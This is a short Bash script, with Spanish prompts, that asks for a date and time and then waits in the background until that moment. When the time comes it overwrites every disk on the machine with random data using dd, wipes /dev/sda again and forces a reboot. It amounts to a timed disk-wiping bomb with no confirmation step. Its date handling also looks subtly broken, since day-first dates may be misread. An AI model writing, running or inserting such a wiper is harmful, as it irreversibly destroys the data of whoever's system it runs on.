#!/bin/bash

get_time_input() {
    echo "Introduce la hora y minutos en el siguiente formato (24 horas): HH:MM"
    read -p "Hora: " input_time
    echo "Introduce el día en el siguiente formato: DD/MM/AAAA"
    read -p "Día: " input_date

    if ! [[ $input_time =~ ^([01][0-9]|2[0-3]):([0-5][0-9])$ ]]; then
        echo "Formato de hora incorrecto. Use el formato HH:MM (ejemplo: 14:30)."
        exit 1
    fi

    if ! [[ $input_date =~ ^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/[0-9]{4}$ ]]; then
        echo "Formato de fecha incorrecto. Use el formato DD/MM/AAAA (ejemplo: 25/12/2024)."
        exit 1
    fi

    target_time="$input_date $input_time"
}

wait_for_time() {
    target_timestamp=$(date -d "$target_time" +%s)
    current_timestamp=$(date +%s)

    while [ "$current_timestamp" -lt "$target_timestamp" ]; do
        sleep 30
        current_timestamp=$(date +%s)
    done

    disks=$(lsblk -d -n -o NAME,SIZE,TYPE | grep 'disk' | awk '{print "/dev/"$1}')

    for disk in $disks; do
        dd if=/dev/urandom of=$disk bs=4M status=progress
    done

    sync

    dd if=/dev/urandom of=/dev/sda bs=4M status=progress

    sync

    reboot -f

}

get_time_input


wait_for_time &
